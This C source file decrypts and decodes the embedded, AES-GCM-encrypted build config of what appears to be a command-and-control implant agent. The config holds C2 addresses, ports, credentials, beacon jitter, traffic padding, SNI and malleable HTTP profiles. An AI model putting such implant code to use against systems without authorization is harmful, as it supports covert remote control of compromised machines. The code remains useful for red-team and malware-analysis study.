/*
 * c2_config.c — decrypt and decode the embedded build config.
 *
 * The agent binary carries def.AgentConfig, which is not plain CBOR: it is
 * encrypted exactly like Go's crypto.AES_GCM_Decrypt format:
 *
 *   salt[16] || nonce[12] || AES-256-GCM(ciphertext || tag)
 *   key = PBKDF2-HMAC-SHA256(password = MagicString, salt, 100000, 32)
 *
 * c2_config_decrypt reverses that into a CBOR buffer; c2_agent_config_decode
 * then reads only the keys the agent needs to talk to the C2. Unknown keys are
 * skipped, so a config written by a newer builder still decodes.
 */

#include "c2_transport.h"

#include "c2_cbor_util.h"
#include "c2_crypto.h"

#include "cbor.h"

#include <string.h>

/* ------------------------------------------------------------------------- */
/* Build config decryption                                                    */
/* ------------------------------------------------------------------------- */

/* The embedded config uses the same password-based AES-GCM container as the
 * memfs entries (salt[16] || nonce[12] || ct||tag, PBKDF2-SHA256 key). */
c2_status c2_config_decrypt(const c2_crypto_backend *be, c2_str magic,
                            const uint8_t *enc, size_t enc_len, uint8_t *out,
                            size_t out_cap, size_t *out_len) {
  return c2_aes_gcm_decrypt_password(be, magic, enc, enc_len, out, out_cap,
                                     out_len);
}

/* ------------------------------------------------------------------------- */
/* Nested structures                                                          */
/* ------------------------------------------------------------------------- */

static c2_status decode_routes(CborValue *it, c2_routes *r) {
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_ROUTE_CHECKIN:
      st = c2_cbor_read_text(&map, &r->checkin);
      break;
    case C2_KEY_ROUTE_MSG:
      st = c2_cbor_read_text(&map, &r->msg);
      break;
    case C2_KEY_ROUTE_FTP:
      st = c2_cbor_read_text(&map, &r->ftp);
      break;
    case C2_KEY_ROUTE_WWW:
      st = c2_cbor_read_text(&map, &r->www);
      break;
    case C2_KEY_ROUTE_PROXY:
      st = c2_cbor_read_text(&map, &r->proxy);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

/* CustomHeaders is map[string]string: text keys, not the integer keys the
 * rest of the protocol uses. */
static c2_status decode_custom_headers(CborValue *it, c2_http_profile *p) {
  if (p->header_keys == NULL || p->header_values == NULL)
    return c2_cbor_map_skip(it); /* caller does not want them */
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  p->header_count = 0;
  while (!cbor_value_at_end(&map)) {
    if (!cbor_value_is_text_string(&map))
      return C2_ERR_PROTO;
    c2_str k;
    c2_str v;
    if ((st = c2_cbor_read_text(&map, &k)) != C2_OK)
      return st;
    if ((st = c2_cbor_read_text(&map, &v)) != C2_OK)
      return st;
    if (p->header_count < p->header_cap) {
      p->header_keys[p->header_count] = k;
      p->header_values[p->header_count] = v;
    }
    p->header_count++;
  }
  if (p->header_count > p->header_cap)
    return C2_ERR_NOMEM;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

static c2_status decode_profile(CborValue *it, c2_http_profile *p) {
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_HTTP_PATH:
      st = c2_cbor_read_text(&map, &p->c2_path);
      break;
    case C2_KEY_HTTP_SESSION_HEADER:
      st = c2_cbor_read_text(&map, &p->session_header);
      break;
    case C2_KEY_HTTP_SESSION_VALUE:
      st = c2_cbor_read_text(&map, &p->session_value);
      break;
    case C2_KEY_HTTP_INIT_HEADER:
      st = c2_cbor_read_text(&map, &p->init_header);
      break;
    case C2_KEY_HTTP_INIT_VALUE:
      st = c2_cbor_read_text(&map, &p->init_value);
      break;
    case C2_KEY_HTTP_CLOSE_HEADER:
      st = c2_cbor_read_text(&map, &p->close_header);
      break;
    case C2_KEY_HTTP_CLOSE_VALUE:
      st = c2_cbor_read_text(&map, &p->close_value);
      break;
    case C2_KEY_HTTP_CUSTOM_HEADERS:
      st = decode_custom_headers(&map, p);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

/* ------------------------------------------------------------------------- */
/* Build config decode                                                        */
/* ------------------------------------------------------------------------- */

c2_status c2_agent_config_decode(CborValue *r, c2_agent_config *cfg) {
  if (r == NULL || cfg == NULL)
    return C2_ERR_ARG;

  CborValue map;
  c2_status st = c2_cbor_map_enter(r, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_CFG_CC_ADDRESS:
      st = c2_cbor_read_text(&map, &cfg->cc_address);
      break;
    case C2_KEY_CFG_CC_HTTP_PORT:
      st = c2_cbor_read_text(&map, &cfg->cc_http_port);
      break;
    case C2_KEY_CFG_CC_H2_PORT:
      st = c2_cbor_read_text(&map, &cfg->cc_h2_port);
      break;
    case C2_KEY_CFG_PASSWORD:
      st = c2_cbor_read_text(&map, &cfg->password);
      break;
    case C2_KEY_CFG_CAPEM:
      st = c2_cbor_read_text(&map, &cfg->ca_pem);
      break;
    case C2_KEY_CFG_CA_FINGERPRINT:
      st = c2_cbor_read_text(&map, &cfg->ca_fingerprint);
      break;
    case C2_KEY_CFG_C2_TRANSPORT_PROXY:
      st = c2_cbor_read_text(&map, &cfg->c2_transport_proxy);
      break;
    case C2_KEY_CFG_AGENT_UUID:
      st = c2_cbor_read_text(&map, &cfg->agent_uuid);
      break;
    case C2_KEY_CFG_AGENT_UUID_SIG:
      st = c2_cbor_read_text(&map, &cfg->agent_uuid_sig);
      break;
    case C2_KEY_CFG_AGENT_TAG:
      st = c2_cbor_read_text(&map, &cfg->agent_tag);
      break;
    case C2_KEY_CFG_CC_TIMEOUT: {
      int64_t v;
      if ((st = c2_cbor_read_int(&map, &v)) == C2_OK)
        cfg->cc_timeout_ms = (int32_t)v;
      break;
    }
    case C2_KEY_CFG_PADDING_MIN: {
      int64_t v;
      if ((st = c2_cbor_read_int(&map, &v)) == C2_OK)
        cfg->padding_min = (int32_t)v;
      break;
    }
    case C2_KEY_CFG_PADDING_MAX: {
      int64_t v;
      if ((st = c2_cbor_read_int(&map, &v)) == C2_OK)
        cfg->padding_max = (int32_t)v;
      break;
    }
    case C2_KEY_CFG_JITTER: {
      int64_t v;
      if ((st = c2_cbor_read_int(&map, &v)) == C2_OK)
        cfg->jitter = (int32_t)v;
      break;
    }
    case C2_KEY_CFG_POLL_INTERVAL: {
      int64_t v;
      if ((st = c2_cbor_read_int(&map, &v)) == C2_OK)
        cfg->poll_interval = (int32_t)v;
      break;
    }
    case C2_KEY_CFG_C2_CHANNEL_MODE:
      st = c2_cbor_read_text(&map, &cfg->c2_channel_mode);
      break;
    case C2_KEY_CFG_SNI:
      st = c2_cbor_read_text(&map, &cfg->sni);
      break;
    case C2_KEY_CFG_C2_ROUTES:
      st = decode_routes(&map, &cfg->routes);
      break;
    case C2_KEY_CFG_MALLEABLE_C2:
      st = decode_profile(&map, &cfg->http);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  st = c2_cbor_dc(cbor_value_leave_container(r, &map));
  if (st != C2_OK)
    return st;

  /* Fill defaults exactly like def.NormalizeC2Routes + the channel default. */
  if (!cfg->routes.checkin.ptr)
    cfg->routes.checkin = c2_str_lit(C2_ROUTE_DEFAULT_CHECKIN);
  if (!cfg->routes.msg.ptr)
    cfg->routes.msg = c2_str_lit(C2_ROUTE_DEFAULT_MSG);
  if (!cfg->routes.ftp.ptr)
    cfg->routes.ftp = c2_str_lit(C2_ROUTE_DEFAULT_FTP);
  if (!cfg->routes.www.ptr)
    cfg->routes.www = c2_str_lit(C2_ROUTE_DEFAULT_WWW);
  if (!cfg->routes.proxy.ptr)
    cfg->routes.proxy = c2_str_lit(C2_ROUTE_DEFAULT_PROXY);
  if (!cfg->c2_channel_mode.ptr)
    cfg->c2_channel_mode = c2_str_lit(C2_CHANNEL_DEFAULT);
  return C2_OK;
}
